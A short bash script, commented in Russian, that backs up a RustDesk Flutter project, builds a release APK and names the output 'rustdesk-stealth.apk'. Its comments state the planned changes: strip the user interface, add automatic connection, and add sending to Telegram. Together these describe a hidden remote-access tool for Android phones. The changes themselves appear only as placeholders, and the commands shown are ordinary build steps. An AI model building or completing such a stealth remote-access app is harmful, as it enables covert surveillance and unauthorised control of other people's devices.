
#!/bin/bash
echo "Building stealth RustDesk APK..."

# Создаем backup оригинального кода
cp -r flutter flutter-backup

# Здесь будут наши модификации
# 1. Убираем UI
# 2. Добавляем авто-подключение
# 3. Добавляем отправку в Telegram

cd flutter

# Собираем APK
flutter clean
flutter pub get
flutter build apk --release

if [ -f "build/app/outputs/apk/release/app-release.apk" ]; then
    echo "Stealth APK built successfully!"
    cp build/app/outputs/apk/release/app-release.apk ../rustdesk-stealth.apk
    echo "APK: rustdesk-stealth.apk"
else
    echo "Build failed"
    exit 1
fi
